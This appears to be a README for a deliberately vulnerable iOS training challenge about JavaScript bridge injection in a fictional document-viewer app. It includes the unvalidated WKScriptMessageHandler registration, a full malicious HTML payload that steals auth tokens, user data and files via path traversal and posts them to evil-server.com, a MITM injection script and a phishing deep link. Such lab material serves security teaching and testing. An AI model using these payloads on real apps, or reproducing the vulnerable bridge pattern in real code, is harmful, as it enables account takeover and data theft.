# oxo-ios-ben21: iOS JavaScript Bridge Injection

## Challenge Details

### Description

DocViewer Pro is a professional document management application for iOS that enables users to view, organize, and collaborate on various document types. The app provides comprehensive document management features including cloud storage integration, advanced search capabilities, user authentication, and interactive document viewing through WebViews.

The application features:
- Multi-user authentication system with enterprise-grade user accounts
- Document library with support for PDF, Word, Excel, PowerPoint, images, and HTML files
- Cloud storage integration with Google Drive, Dropbox, and OneDrive
- Advanced search and filtering capabilities with tag-based organization
- Interactive document viewing with JavaScript-enabled WebViews
- Professional user interface with comprehensive settings and profile management

### Vulnerability Type and Category
- **Type:** JavaScript Bridge Injection / WebView JavaScript Interface Exposure
- **Category:** Platform Security (OWASP Mobile M7 - Client Code Quality)
- **CWE:** CWE-749 (Exposed Dangerous Method or Function), CWE-79 (Cross-site Scripting)

### Difficulty
Medium

## Vulnerability Overview

The DocViewer Pro application exposes multiple JavaScript bridges to WebView content without proper input validation or origin verification. These bridges provide access to sensitive native iOS functionality including file system operations, user authentication data, device information, and cloud storage operations.

## Attack Vector: JavaScript Bridge Exploitation

**Brief Explanation**: The app registers multiple WKScriptMessageHandlers (`documentHandler`, `fileManager`, `cloudSync`, `authBridge`, `deviceManager`) that can be called from any JavaScript content loaded in the WebView, including malicious HTML documents or compromised web content.

**Key Characteristics:**
- Professional document management app with no obvious vulnerability indicators
- WebView bridges exposed for legitimate document interaction functionality
- No origin validation or input sanitization on bridge message handlers
- Direct access to sensitive iOS APIs through JavaScript calls
- User authentication tokens and personal data accessible via bridge functions

**Vulnerable Code Pattern:**
```swift
// WebViewManager.swift - Bridge registration without validation
let contentController = WKUserContentController()
contentController.add(self, name: "documentHandler")
contentController.add(self, name: "fileManager")
contentController.add(self, name: "cloudSync")
contentController.add(self, name: "authBridge")
contentController.add(self, name: "deviceManager")
```

## Build Instructions

### Prerequisites
- Xcode 15.0 or later
- iOS 17.0+ deployment target
- Swift 5.9+

### Building the App
1. Open `DocViewer.xcodeproj` in Xcode
2. Select your target device or simulator (iOS 17.0+)
3. Build and run the project (⌘+R)

## Authentication

### User Registration
The application requires user registration to access features:

- Create a new account using any email and password
- All new accounts start with an empty document library
- Users can create documents through the "+" button in the Documents tab

### Testing the Vulnerability

1. **Build and run the app** in Xcode or iOS Simulator
2. **Register a new account** with any email/password combination
3. **Create a malicious document**:
   - Tap the "+" button in the Documents tab to add it
4. **Open the malicious document** to trigger the vulnerability
5. **Observe the exploit log** showing real-time data extraction

## Exploitation

### Attack Vectors

#### 1. Malicious HTML Document
Create an HTML file with JavaScript bridge exploitation:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Document</title>
</head>
<body>
    <h1>Document Content</h1>
    <p>This appears to be a legitimate document...</p>
    
    <script>
        // Exploit 1: Extract user authentication data
        if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.authBridge) {
            window.webkit.messageHandlers.authBridge.postMessage({
                action: 'getCurrentUser'
            });
            
            window.webkit.messageHandlers.authBridge.postMessage({
                action: 'getAuthToken'
            });
        }
        
        // Exploit 2: Access file system
        if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.fileManager) {
            window.webkit.messageHandlers.fileManager.postMessage({
                action: 'listDirectory',
                path: '../'
            });
            
            // Attempt to read sensitive files
            window.webkit.messageHandlers.fileManager.postMessage({
                action: 'readFile',
                path: '../Library/Preferences/com.apple.identityservices.plist'
            });
        }
        
        // Exploit 3: Extract device information
        if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.deviceManager) {
            window.webkit.messageHandlers.deviceManager.postMessage({
                action: 'getDeviceInfo'
            });
        }
        
        // Exploit 4: Access documents and cloud data
        if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.documentHandler) {
            window.webkit.messageHandlers.documentHandler.postMessage({
                action: 'getDocumentList'
            });
        }
        
        // Set up receivers for exfiltrated data
        window.receiveUserInfo = function(userInfo) {
            console.log('User data extracted:', userInfo);
            // Exfiltrate to attacker server
            fetch('https://evil-server.com/collect', {
                method: 'POST',
                body: JSON.stringify({type: 'user_data', data: userInfo})
            });
        };
        
        window.receiveAuthToken = function(token) {
            console.log('Auth token extracted:', token);
            // Exfiltrate authentication token
            fetch('https://evil-server.com/collect', {
                method: 'POST',
                body: JSON.stringify({type: 'auth_token', data: token})
            });
        };
        
        window.receiveDeviceInfo = function(deviceInfo) {
            console.log('Device info extracted:', deviceInfo);
            // Exfiltrate device information
            fetch('https://evil-server.com/collect', {
                method: 'POST',
                body: JSON.stringify({type: 'device_info', data: deviceInfo})
            });
        };
        
        window.receiveFileContent = function(content) {
            console.log('File content extracted:', content);
            // Exfiltrate sensitive file contents
            fetch('https://evil-server.com/collect', {
                method: 'POST',
                body: JSON.stringify({type: 'file_content', data: content})
            });
        };
    </script>
</body>
</html>
```

#### 2. Man-in-the-Middle Attack
If the app loads content over HTTP, inject malicious JavaScript:

```javascript
// Injected via MITM attack
if (window.webkit && window.webkit.messageHandlers) {
    // Extract all available bridge handlers
    const bridges = ['documentHandler', 'fileManager', 'cloudSync', 'authBridge', 'deviceManager'];
    
    bridges.forEach(bridge => {
        if (window.webkit.messageHandlers[bridge]) {
            console.log('Found bridge:', bridge);
            
            // Attempt various exploitation techniques per bridge
            switch(bridge) {
                case 'authBridge':
                    window.webkit.messageHandlers[bridge].postMessage({action: 'getCurrentUser'});
                    window.webkit.messageHandlers[bridge].postMessage({action: 'getAuthToken'});
                    break;
                case 'fileManager':
                    window.webkit.messageHandlers[bridge].postMessage({action: 'listDirectory', path: '../'});
                    break;
                case 'deviceManager':
                    window.webkit.messageHandlers[bridge].postMessage({action: 'getDeviceInfo'});
                    break;
            }
        }
    });
}
```

#### 3. Phishing via Malicious URLs
Share links to malicious HTML documents:

```
docviewer://open?url=https://evil-server.com/malicious-document.html
```

### Expected Results

Successful exploitation should result in:

1. **User Data Extraction**: Full name, email, company, subscription plan
2. **Authentication Token Theft**: Active session tokens for account takeover
3. **File System Access**: Ability to read/write files in app sandbox
4. **Device Fingerprinting**: Device model, OS version, unique identifiers
5. **Document Access**: List and content of all user documents
6. **Cloud Service Abuse**: Unauthorized access to connected cloud accounts